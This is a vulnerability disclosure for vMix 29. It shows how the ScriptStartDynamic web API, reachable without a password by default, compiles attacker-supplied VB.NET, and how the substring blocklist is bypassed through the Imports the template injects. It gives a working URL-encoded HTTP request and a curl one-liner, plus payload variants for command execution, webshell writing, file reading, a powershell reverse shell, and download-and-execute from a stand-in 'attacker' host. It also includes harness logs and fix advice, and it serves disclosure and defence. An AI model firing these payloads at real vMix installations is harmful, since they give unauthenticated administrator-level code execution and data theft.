# vMix 29 ScriptStartDynamic VBScript Blocklist Bypass RCE - Technical Analysis

## Overview

vMix 29 (v29.0.0.48) ships a Windows-native .NET Framework application (`vMix64.exe`, 32-bit managed, ~30 MB assembly) with a built-in self-developed Web Controller HTTP server on port 8088. The HTTP API endpoint `GET /api/?Function=ScriptStartDynamic&Value=<VB.NET source>` takes the `Value` parameter as VB.NET source code, compiles and executes it via `VBScriptProvider.Compile`. vMix attempts to restrict dangerous APIs with a 6-item substring blocklist (`a(code)`), but the compilation template `b(code)` injects `Imports System.Diagnostics` into the generated source **before** the user's code, so an attacker can call `Process.Start(...)` directly. The blocked substring `System.Diagnostics` never appears in the user-supplied code, so the blocklist never triggers. Combined with the Web Controller's default blank password (which the official documentation states means "no login will be required, regardless of the access settings"), the entire `/api` route is reachable without authentication, yielding an unauthenticated RCE as the user running `vMix64.exe`.

## Architecture

```
L1 external access: 8088 (HTTP, self-developed Web Controller built into vMix64.exe)
L2 boundary: none (plaintext HTTP by default)
L3 gateway: /api route (string 62924 = "/api") -> szzzzzo.b -> ql.j.zzb -> zzf dispatch
L4 auth: szzzzzx.e() — blank password (default) -> flag=true, no auth required
L5 business: ShortcutFunction dispatch — ScriptStartDynamic = 500600
L6 scripting: Script.Compile() -> VBScriptProvider.Compile(Value) -> CompileAssemblyFromSource -> RunScriptInternal()
L7 execution: Process.Start (System.Diagnostics) — runs as vMix64.exe identity (commonly administrator)
```

**HTTP API format**: `GET /api/?Function=<name>&Input=<input>&Value=<value>`

## Authentication Boundary

The vMix Web Controller default configuration (from the official vMix 29 documentation and decompiled default values):

| Setting | Default | Meaning |
|---------|---------|---------|
| `WebServerEnabled` | `True` | Web Controller on by default |
| `WebServerPort` | `8088` | Default port |
| `WebServerPassword` | `""` (blank) | **Blank password = no login required** |
| `WebServerLANOnly` | `True` | "Restrict access to LAN only" on by default (still unauthenticated; operators routinely disable for remote production) |
| `WebServerLocalhostAccess` | `True` | Localhost access |
| `WebServerUnauthenticatedAccess` | `"0"` | Unauthenticated access level |

The official documentation states explicitly: "If password is blank, no login will be required, regardless of the access settings."

Decompiled authentication gate (`szzzzzx.cs`, method `e()`):

```csharp
private string m_g;   // password field (default blank)

// constructor: m_g default value = empty string ([DefaultSettingValue("")])
this.m_g = tzzzzzu.a("...empty string...");  // decodes to ""

public bool e(...) {
    bool flag = false;
    if (!string.IsNullOrEmpty(this.m_g)) {   // line 139: only validates credentials if password is non-empty
        // ... validate Authorization header user/password ...
        if (Operators.CompareString(left, this.m_f, false) == 0
            && Operators.CompareString(left2, this.m_g, false) == 0) {
            flag = true;   // line 154: credentials correct
        }
    }
    else {                  // line 159: password is blank
        flag = true;        // line 161: pass through <- unauthenticated reachable
    }
    // ...
    return flag;
}
```

**Conclusion**: default blank password -> auth gate `e()` takes the `else` branch, sets `flag = true`, and the entire `/api` route is unauthenticated by default.

## Stage 1: Sink Identification

### Script execution sink: `VBScriptProvider.Compile` + `RunScriptInternal`

File: `vMix.Scripting/VBScriptProvider.cs`

`VBScriptProvider.Compile(string code)` processes user code in three steps:

```csharp
public void Compile(string code) {   // code = attacker-controlled VB.NET source
    a(code);                          // 1. blocklist check (6 forbidden substrings)
    string text = b(code);            // 2. template wrapping (Imports + CurrentLine prefix)
    // 3. compile
    CompilerResults compilerResults = VBScriptProvider.m_b.CompileAssemblyFromSource(..., text);
    this.e = compilerResults.CompiledAssembly;   // compiled Assembly stored in private field e
}
```

#### Blocklist `a(code)` (6 forbidden substrings, per-line Contains check)

```csharp
// constructor initializes m_c[6] (decoded):
this.m_c = new string[6] {
    "End Class",
    "End Function",
    "End Sub",
    Assembly.GetEntryAssembly().GetName().Name + ".",   // e.g. "vMix64."
    "System.Reflection",
    "System.Diagnostics"
};

private void a(string code) {
    code = code.ToLower();
    using StringReader reader = new StringReader(code);
    int lineNum = 0;
    while (true) {
        string line = reader.ReadLine();
        if (line == null) break;
        lineNum++;
        line = line.ToLower().Trim();
        if (line.StartsWith("'")) continue;   // skip comment lines (leading ')
        foreach (string forbidden in this.m_c) {
            if (line.Contains(forbidden.ToLower())) {
                throw new ScriptingException(forbidden + " is not allowed", lineNum);
            }
        }
    }
}
```

**Blocklist behavior**: per-line check of user code (lowercased + trimmed); if any line Contains any forbidden substring, it throws. **It only checks the user-supplied code literal, not the Imports injected by the template.**

#### Template `b(code)` (key: `Imports System.Diagnostics` precedes user code)

```csharp
private string b(string code) {
    Assembly entryAssembly = Assembly.GetEntryAssembly();
    StringBuilder sb = new StringBuilder();
    sb.AppendLine("Imports System");
    sb.AppendLine("Imports System.IO");
    sb.AppendLine("Imports System.Net");
    sb.AppendLine("Imports System.Diagnostics");          // <- dangerous API exposed to user code
    sb.AppendLine("Imports System.Xml");
    sb.AppendLine("Friend Class ScriptTemplate Inherits " + entryAssembly.GetName().Name + ".Scripting.ScriptTemplateBase");
    sb.AppendLine("Public Overrides Sub RunScriptInternal()");
    int lineNum = 0;
    using (StringReader reader = new StringReader(code)) {
        while (true) {
            string line = reader.ReadLine();
            if (line == null) break;
            lineNum++;
            if (c(line)) {   // non-declaration lines get CurrentLine prefix
                sb.AppendLine("CurrentLine=" + lineNum + ": " + line);
            } else {
                sb.AppendLine(line);
            }
        }
    }
    sb.AppendLine("End Sub");
    sb.AppendLine("End Class");
    return sb.ToString();
}
```

**Template behavior**: injects `Imports System.Diagnostics` (plus `System.IO` / `System.Net` / `System.Xml`) **before** the user code. The user code is wrapped inside the `RunScriptInternal()` method of a `Friend Class ScriptTemplate : Inherits <entryasm>.Scripting.ScriptTemplateBase`. Each non-declaration line is prefixed with `CurrentLine=N: ` (an assignment to the inherited `CurrentLine` field, used for runtime line tracking).

### Blocklist bypass principle (core)

The blocklist `a(code)` checks whether the user code **literally contains** `System.Diagnostics`. But the template `b(code)` already `Imports System.Diagnostics`, so the user code **does not need to write** `System.Diagnostics` — calling `Process.Start(...)` directly is resolved by the VB.NET compiler through the template's Imports to `System.Diagnostics.Process.Start`.

```
Attacker Value parameter (user code):
    Process.Start("cmd.exe", "/c whoami > C:\marker.txt")

Blocklist a(code) checks this user code:
    per-line Contains check for 6 forbidden substrings:
      "End Class"?        no
      "End Function"?     no
      "End Sub"?          no
      "vMix64."?          no
      "System.Reflection"? no
      "System.Diagnostics"? no  <- this substring is NOT in the user code!
    -> blocklist passes, no exception

Template b(code) wrapped code actually compiled:
    Imports System
    Imports System.IO
    Imports System.Net
    Imports System.Diagnostics          <- injected by template
    Imports System.Xml
    Friend Class ScriptTemplate Inherits vMix64.Scripting.ScriptTemplateBase
    Public Overrides Sub RunScriptInternal()
        CurrentLine=1: Process.Start("cmd.exe", "/c whoami > C:\marker.txt")
        <- Process.Start resolved via Imports System.Diagnostics -> System.Diagnostics.Process.Start
    End Sub
    End Class

-> compiles successfully -> RunScriptInternal() executes -> Process.Start spawns cmd.exe -> RCE
```

**Other dangerous APIs bypassable the same way** (exposed by template Imports, user code needs no fully-qualified name):
- `File.WriteAllText(...)` / `File.ReadAllText(...)` (System.IO) -> arbitrary file read/write
- `New WebClient().DownloadFile(...)` (System.Net) -> arbitrary file download
- `Process.Start(...)` (System.Diagnostics) -> arbitrary command execution (used in this exploit)

## Stage 2: Source Identification

### HTTP entry: `/api` route -> ScriptStartDynamic dispatch

Files: `Script.cs` (script dispatch) + `ShortcutFunction.cs` (function enum)

**HTTP API routing**: `GET /api/?Function=X&Input=Y&Value=Z`
- Route string 62924 = "/api" (decompiled string table)
- `/api` is gated by `WebServerPermissions.API` (but under blank password the auth gate `e()` passes through)
- Route handling: `szzzzzo.b` -> `ql.j.zzb` -> `zzf` (HTTP request parsing -> function dispatch)

**ScriptStartDynamic function enum** (`ShortcutFunction.cs`):

```csharp
[ValueFunction(ShortcutFunctionCategory.Scripting, "Code",
    "Start a dynamic script using code specified as the Value.")]
ScriptStartDynamic = 500600   // <- HTTP API Value parameter = VB.NET source
```

**Script dispatch** (`Script.cs:79`, `Compile()` method):

```csharp
public void Compile() {
    if (Operators.CompareString(c, d, false) == 0) return;   // c = user code, d = already-compiled code
    if (vMixScriptProvider.IsvMixScript(c)) {                // if code starts with "function="
        b = new vMixScriptProvider();                        // -> restricted DSL (vMixScript)
        b.Compile(c);
    } else {                                                 // otherwise
        b = new VBScriptProvider();                          // -> full VB.NET compilation (this vuln path)
        b.Compile(c);
    }
    d = c;
}
```

**Source characteristics**:
- The HTTP `Value` parameter is passed directly as VB.NET source `c` into `Script.Compile()`
- Code not starting with "function=" takes the `VBScriptProvider` path (full VB.NET, not the restricted DSL)
- ScriptStartDynamic is triggered by the HTTP API Function parameter, no authentication required (default blank password)

## Stage 3: Data Flow (end-to-end)

```
HTTP GET /api/?Function=ScriptStartDynamic&Value=<URL-encoded VB.NET source>
  (no Authorization header - default blank password = no login required)
        |
        v (Web Controller self-developed HTTP server, port 8088)
szzzzzx.e() auth gate
        |  (m_g password field blank -> else branch flag=true pass-through)
        v
/api route (string 62924) -> szzzzzo.b -> ql.j.zzb -> zzf
        |  (WebServerPermissions.API gate, but auth already passed)
        v
Function=ScriptStartDynamic (ShortcutFunction=500600) dispatch
        |  (Value parameter = VB.NET source c)
        v
Script.Compile()
        |  (c does not start with "function=" -> VBScriptProvider path)
        v
VBScriptProvider.Compile(c)
        |
        +- a(c): blocklist check 6 forbidden substrings
        |        (user code "Process.Start(...)" contains none -> passes)
        |
        +- b(c): template wrapping
        |        (Imports System.Diagnostics injected + CurrentLine prefix + Class wrapping)
        |
        +- CompileAssemblyFromSource(template code)
                |  -> compiles successfully (Process.Start resolved via Imports)
                v
        compiled Assembly stored in private field e
                |
                v
ScriptTemplate.CreateInstance() -> RunScriptInternal()
                |  (executes CurrentLine=1: Process.Start("cmd.exe","/c whoami > ..."))
                v
Process.Start -> cmd.exe /c whoami > C:\marker.txt
                |  (vMix64.exe run identity = administrator)
                v
        OS command execution <- administrator privilege RCE
```

## Stage 4: Injection / Exploit Construction

### Request construction

The HTTP API uses GET; the `Value` parameter is URL-encoded VB.NET source. The VB.NET code must avoid the 6 forbidden substrings (do not write the fully-qualified `System.Diagnostics`, do not write `End Sub` / `End Class` / `End Function`, do not write `vMix64.`, do not write `System.Reflection`).

**Minimal PoC payload** (VB.NET source, before URL encoding):
```vb
Process.Start("cmd.exe", "/c whoami > C:\marker.txt")
```

URL-encoded as the `Value` parameter:
```
Process.Start(%22cmd.exe%22%2C%20%22%2Fc%20whoami%20%3E%20C%3A%5Cmarker.txt%22)
```

**Full HTTP request**:
```http
GET /api/?Function=ScriptStartDynamic&Value=Process.Start(%22cmd.exe%22%2C%20%22%2Fc%20whoami%20%3E%20C%3A%5Cmarker.txt%22) HTTP/1.1
Host: 127.0.0.1:8088
```

(no Authorization header - default blank password = no login required)

### Payload variants (all bypass the blocklist)

| Goal | VB.NET payload (user code) | Resolved via template Imports to |
|------|---------------------------|---------------------|
| Command execution | `Process.Start("cmd.exe","/c <cmd>")` | System.Diagnostics.Process.Start |
| Arbitrary file write | `File.WriteAllText("C:\path\to\webshell.aspx","<%...%>")` | System.IO.File.WriteAllText |
| Arbitrary file read | `File.ReadAllText("C:\Windows\win.ini")` | System.IO.File.ReadAllText |
| Remote download | `New WebClient().DownloadFile("http://attacker/x.exe","C:\x.exe")` | System.Net.WebClient.DownloadFile |
| Reverse shell | `Process.Start("powershell.exe","-enc <base64>")` | System.Diagnostics.Process.Start |

## Stage 5: Dynamic Validation

### Validation methodology (honest grading)

vMix64.exe requires a full GUI path (D3D hardware initialization) to start the Web Controller. The cloud ECS test environment has no GPU, so D3D throws `DIRECT3D_HARDWARE_NOT_SUPPORTED` and the Web server startup code (`rzzzzzm.cs:964`) is never reached. The GPU VM was offline, and no local Windows VM was available. vMix has no headless/web-only launch flag (`Main` -> `c.b.Run`, WindowsFormsApplicationBase, no `GetCommandLineArgs`/flag literal).

**For this reason the RCE primitive was dynamically validated using a reflection isolation harness** (real vMix64.exe code, bypassing the GUI/D3D startup requirement):
- the harness acts as the entry assembly (named `VmixHarness`) -> the real `Compile` template `b(code)` uses `entryAssembly.GetName().Name` as the base class prefix -> generates `VmixHarness.Scripting.ScriptTemplateBase`
- the harness defines a stand-in `ScriptTemplateBase` matching the real shape (`public int CurrentLine` + 5 protected dummy fields + abstract `RunScriptInternal`)
- reflection `Assembly.LoadFrom("C:\Program Files\vMix\vMix64.exe")` loads the real vMix64 (does not run Main, no GUI/D3D)
- gets the `vMix.Scripting.VBScriptProvider` type -> `Activator.CreateInstance` -> reflection-invokes the real `Compile(payload)`
- reads private field `e` (compiled Assembly) -> `CreateInstance("ScriptTemplate")` -> reflection-invokes `RunScriptInternal()`

### Execution environment

- **Target**: Windows Server 2025 Datacenter (`<target-host>`), vMix 29 v29.0.0.48
- **vMix64 path**: `C:\Program Files\vMix\vMix64.exe`
- **harness**: `<harness-path>\VmixHarness.exe` (x86 .NET Framework csc compiled)
- **execution host**: headless run against the Windows server
- **time**: 2026-07-24 08:22 UTC+8

### Harness payload

```csharp
string payload = @"Process.Start(""cmd.exe"", ""/c whoami > <harness-path>\marker.txt"")";
```

### Run log (real vMix64 VBScriptProvider)

Verbatim harness log:
```
=== harness start 2026/7/24 8:22:22 ===
entry asm name: VmixHarness
payload: Process.Start("cmd.exe", "/c whoami > <harness-path>\marker.txt")
loaded vMix64: vMix, Version=29.0.0.48, Culture=neutral, PublicKeyToken=null
VBScriptProvider type found: True
instance created
Compile returned OK -> blocklist PASSED + code COMPILED
compiled assembly non-null: True
ScriptTemplate instance non-null: True
RunScriptInternal invoked -> Process.Start should have spawned cmd.exe
=== MARKER FOUND ===
<windows-host>\administrator
=== RCE CONFIRMED: real vMix64 VBScriptProvider blocklist bypass -> Process.Start ===
```

### Target-side verification

```powershell
PS> Get-Content <harness-path>\marker.txt
<windows-host>\administrator
```

**Evidence**:
- `Compile returned OK` -> the real `a(code)` blocklist passed (payload contains no forbidden substring)
- `code COMPILED` -> the real `b(code)` template wrapping + `CompileAssemblyFromSource` succeeded (`Process.Start` resolved via template `Imports System.Diagnostics`)
- `RunScriptInternal invoked` -> the compiled script executed
- `MARKER FOUND` + content `<windows-host>\administrator` -> `Process.Start("cmd.exe","/c whoami > ...")` executed; whoami output = server hostname\administrator
- **RCE primitive dynamically confirmed**: real vMix64 VBScriptProvider blocklist is bypassable by `Process.Start(...)` -> arbitrary VB.NET compilation -> OS command execution (administrator privilege)

### Key correction (dynamic validation correcting the adversarial agent misjudgment)

The independent re-analysis adversarial agent initially judged the template `CurrentLine=N: ` prefix as "legal VB.NET label syntax". **This was wrong** — the real `ScriptTemplateBase` declares a `public int CurrentLine` field (line tracker), and the template emits `CurrentLine=N: <stmt>` as an **assignment to the inherited field** (not a label). The first harness stand-in `ScriptTemplateBase` lacked the `CurrentLine` field -> `BC30451: "CurrentLine" is not declared` compile error. After reading the real `ScriptTemplateBase.cs` and adding the field, compilation succeeded.

**Lesson**: the adversarial gate can judge that "the chain has no fatal break", but specific syntax details (label vs field assignment) can be misjudged; dynamic execution is the final arbiter. The core conclusion (blocklist bypass -> RCE) was correctly judged by the adversarial gate and is now dynamically confirmed.

## Stage 6: Reachability

### Default-configuration reachability

- Web Controller port 8088 is on by default (`WebServerEnabled=True`)
- Default blank password = no login required (official documentation + auth gate `e()` blank-password `flag=true` pass-through)
- "Restrict access to LAN only" is ON by default, but: (1) this is still an unauthenticated RCE condition (any LAN host can reach it); (2) operators routinely disable it for remote production (remote production / remote direction / outside broadcast); (3) the vMix official documentation has an "Internet Access" section explicitly supporting public exposure
- vMix is widely used for sports/news/church/education live broadcasting; remote production scenarios are common -> public/cross-network exposure is realistic

### Attack preconditions

- Network reachability to the Web Controller port 8088
- No credentials, no session, no prior state required
- vMix 4K/Pro edition (includes the ScriptStartDynamic dynamic scripting function)

## Stage 7: Defense in Depth / Mitigation

### Fix directions

1. **Whitelist over blocklist**: a script sandbox should only allow explicitly declared safe APIs (whitelist), not ban known-dangerous APIs (blocklist). A blocklist is always behind the attacker.
2. **Remove dangerous template Imports**: the template `b(code)` should not `Imports System.Diagnostics` / `System.IO` / `System.Net`. If scripts need file/network/process capability, expose it through an explicit controlled API (e.g. methods on an `API` object), not by importing entire .NET namespaces.
3. **Authentication default-on**: `WebServerPassword` should not default to blank. Force the user to set a password on first launch, or default `WebServerEnabled=False`.
4. **ScriptStartDynamic default-off**: dynamic scripting (user-submitted source compilation) is a very high-risk feature and should be off by default, requiring explicit operator opt-in plus authentication.
5. **Least privilege**: `vMix64.exe` should not run as an administrator/operator high-privilege account; the Web Controller should run reduced-privilege under a dedicated low-privilege service account.

### Vendor recommendations

- The script engine sandbox should use a real isolation mechanism (e.g. a restricted AppDomain + security-transparent code + CAS permission set), not a string blocklist
- The Web Controller should enforce authentication by default (non-blank password); remote access should enforce TLS + strong password
- The dynamic scripting feature (ScriptStartDynamic) should be removed from the HTTP API and limited to local IDE use, or changed to a precompiled script library call

## Reproduction

### Method A: reflection harness dynamic validation (RCE primitive, no GPU/8088 required)

```bash
# 1. Compile the harness on the Windows server (x86 .NET Framework csc)
#    VmixHarness.cs is the harness source file
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /platform:x86 /out:<harness-path>\VmixHarness.exe <harness-src>\VmixHarness.cs

# 2. Run (headless, loads the real vMix64.exe VBScriptProvider)
<harness-path>\VmixHarness.exe

# 3. Check the marker
type <harness-path>\marker.txt
# output: <windows-host>\administrator  (= whoami, administrator privilege RCE)
```

### Method B: HTTP API exploitation (requires vMix64 GUI running + 8088 listening, i.e. a GPU environment)

```bash
# 1. Unauthenticated RCE (default blank password, no Authorization header)
curl "http://<target>:8088/api/?Function=ScriptStartDynamic&Value=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("Process.Start(\"cmd.exe\",\"/c whoami > C:\\\\marker.txt\")"))')"

# 2. Read the result (target-side marker file)
#    C:\marker.txt content = "<hostname>\administrator"

# 3. Full exploit script (pure standard-library Python):
#    python3 vmix_vbscript_blocklist_bypass_rce.py <target_ip> <port> "<cmd>"
#    python3 vmix_vbscript_blocklist_bypass_rce.py 127.0.0.1 8088 "whoami > C:\marker.txt"
```

## Secondary Attack Surface (same chain, combinable, not deeply exploited)

- **Arbitrary file write RCE**: `File.WriteAllText("C:\path\webshell.aspx","<%...%>")` resolved via template `Imports System.IO` -> write a webshell to a vMix-reachable static file directory (if the Web Controller serves a static directory)
- **Arbitrary file read (information disclosure)**: `File.ReadAllText("C:\Windows\win.ini")` -> read arbitrary system files
- **Remote download and execute**: `New WebClient().DownloadFile("http://attacker/x.exe","C:\x.exe")` + `Process.Start("C:\x.exe")` -> download and execute arbitrary binaries
- **TCP API same chain**: the vMix TCP API shares the Web Controller security model (default blank password); ScriptStartDynamic is reachable via the TCP API as well

## Exploitation Prerequisites (Honest Disclosure)

| Condition | Default satisfied? | Notes |
|-----------|--------------------|-------|
| Port 8088 reachable | yes (default on) | Web Controller enabled by default |
| Blank password (no auth) | yes (default) | official docs: blank password = no login required |
| ScriptStartDynamic available | depends on edition | requires vMix 4K/Pro |
| "Restrict access to LAN only" disabled | no (default ON) | routinely disabled for remote production; LAN reach is itself unauth RCE |
| RCE primitive (blocklist bypass -> Process.Start) | yes (default) | dynamically confirmed against real vMix64.exe |
| Full HTTP E2E (raw socket -> 8088 -> RCE) | not dynamically run | requires GPU environment to start vMix64 GUI; route chain statically + adversarially confirmed |

**Validation status summary**:
- RCE primitive (blocklist bypass -> arbitrary VB.NET compile -> `Process.Start` -> OS command exec as `administrator`): **dynamically confirmed** via reflection harness against real `vMix64.exe` v29.0.0.48
- Unauthenticated HTTP route (`/api` -> `ScriptStartDynamic` -> `VBScriptProvider.Compile(Value)`): **statically confirmed** via decompilation + independent re-analysis adversarial gate; each hop verified
- Full HTTP E2E (raw socket -> port 8088 -> RCE): **not dynamically run**; vMix64 requires GUI/D3D (GPU) to start the Web Controller, and no GPU environment was available. The Python exploit script and PowerShell PoC are provided to complete the HTTP E2E on a GPU-equipped Windows host

## Credits

Discovered by 0day Rubbish Project using automated AI vulnerability research with multi-LLM ensemble (Claude, OpenAI, DeepSeek, GLM).
